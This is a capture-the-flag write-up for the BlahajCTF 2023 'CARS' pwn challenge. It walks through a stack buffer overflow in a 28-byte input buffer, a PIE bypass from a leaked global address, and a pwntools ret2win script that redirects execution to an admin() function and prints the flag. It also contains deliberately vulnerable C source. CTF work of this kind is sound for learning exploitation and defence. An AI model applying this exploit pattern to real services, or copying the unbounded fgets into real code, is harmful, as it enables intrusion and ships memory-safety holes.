---
title: CARS
date: 2023-12-05
tags: pwn
categories: BlahajCTF 2023
---
# CARS

##### DESC

> **"**I've been playing around with this reporting system for "cyber affairs", generating ticket after ticket in hopes of breaking it. I have a feeling that there's a way to access the admin panel...**"**

###### OVERVIEW

PIE + NX BYPASS (ROP) + RET2WIN

##### EXPLOIT REVIEW

I had access to the CARS binary. When runing checksec on the binary, I had obtained the following information...

```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled

```

Seeing that NX is enabled, I knew that I could not just directly inject shellcode into this program and PIE being enabled suggested that the program's base address is randomised. To bypass these restrictions, the source code had to be looked at.

```c
#include <stdio.h>
#include <stdlib.h>

// Compiled using gcc -o cars -g -fno-stack-protector cars.c

unsigned long report_number = 0;

void setup()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void file_report()
{
    char input[28];
    printf("Please input your student ID: ");
    fgets(input, 28, stdin);
    printf("Please describe the incident: ");
    fgets(input, 256, stdin);
    printf("The matter has been recorded and will be investigated. Thank you.\n");
}

void admin()
{
    // how did you even get here?
    FILE *fptr = fopen("flag", "r");
    if (fptr == NULL)
    {
        printf("Cannot open flag\n");
        exit(0);
    }
    char c;
    while ((c = fgetc(fptr)) != EOF)
    {
        printf("%c", c);
    }
    fclose(fptr);
}

int main()
{
    setup();
    srand(0xb1adee); // this random seed is sooo drain
    report_number = rand();
    printf("Welcome to the Cyber Affairs Reporting System (CARS)\n");
    printf("Report number: #%lu\n", &report_number);
    file_report();
    return 0;
}
```

Paying close attention to the main() function, I had observed that a variable named **report_number** that's being generated from a constant seed **0xb1adee** and it's address (&) being printed out in the long format (%l). Reversing this binary in ghidra gave me the offset of **report number** from the start of the binary file, which is 

```
0x104090 - 0x100000 = 0x4090
```

To calculate program's base address, I had captured the address of **report_number** printed out in the long format, converted it to hex and subtracted 0x4090 from it. I then set the binary ELF's address to this calculated base address. PIE has been bypassed

Looking at the source code, I had noticed that there is a function conveniently planted there named 'admin()' that if called, prints out the flag. But this function is not called by any other function in the program. 

Looking at file_report() immediately called after the printf() statements, I saw that 2 fgets() functions are called and the second of which allows the user to write in 256 bytes of data into the **input** variable that can only hold 28 bytes. This buffer overflow can be exploited to overwrite RIP with admin()'s return address.

Firing up GDB, I used the command 

``` sh

pattern create 400

```
and inputted the generated result into the second fgets() function as discussed earlier. This caused a seg fault that I had used to look up registers. One particular register of interest is RBP and in a x64 stack layout, RBP is right next to the return address of the stack frame which is what I had wanted to control. In the GDB result after the seg fault, I had seen that RBP is overwritten with the generated pattern.

``` sh
$rax   : 0x42              
$rbx   : 0x00007fffffffe2f8  →  0x00007fffffffe5bb  →  "/home/xor8ex/blahaj/cars"
$rcx   : 0x00007ffff7ebfb00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe1d8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7f9c803  →  0xf9da30000000000a ("\n"?)
$rdi   : 0x00007ffff7f9da30  →  0x0000000000000000
$rip   : 0x000055555555528d  →  <file_report+113> ret 
$r8    : 0xfe              
$r9    : 0x0               
$r10   : 0x00007ffff7dd10b8  →  0x00100022000048a8
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffe308  →  0x00007fffffffe5d4  →  "XDG_CURRENT_DESKTOP=GNOME"
$r14   : 0x0000555555557dd8  →  0x0000555555555180  →   endbr64 
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000555555554000  →   j
```

I had then used the simple command 

``` sh
pattern search $rbp
```

to find the offset of RBP. I had then +8 to the offset to find out the offset to the return address since RBP is 8 bytes long. In this case, I had found that the offset to the return address is 40. I then simply constructed a buffer overflow consisting of a payload of 40 bytes + admin()'s func address.

EXPLOIT:

- Capture the address of **report_number** displayed in long format and convert it to hex value
- Subtract 0x4090 from the calculated hex value to obtain program's base address and set it using pwntools 'elf.address=[BASE ADDRESS]'
- Constrcut a payload consisting of 40 bytes + 8 bytes of our desired return address ([BASE ADDRESS] +elf.sym['admin']) | ROP
- Send the payload to the second fgets() in file_report()

EXPLOIT CODE:

``` python
import time
from pwn import *

context(os='linux',arch='amd64')
p=remote("139.59.224.179","30002")
#p=process("./cars")
elf=ELF('./cars')

context.log_level='DEBUG'
output=p.recvuntil("Please")
leaked_address=hex(int(output[-21:-7]))

log.info(leaked_address)

base_address=(int(leaked_address,16)-int("0x4090",16))
log.info(hex((base_address)))

elf.address=base_address

payload=b"A"*40+p64(elf.sym['admin']+1) # When setting p to remote, you have to +1 to elf.sym['admin'] due to MOVAPS issue or else the exploit just fails lmao
#payload=b"A"*40+p64(elf.sym['admin'])
p.sendlineafter("ID: ","")
p.sendlineafter("incident: ",payload)
time.sleep(1)
p.interactive()
```

Running this code, I got the flag 

```
blahaj{r0pp1n6_w17h_p13}
```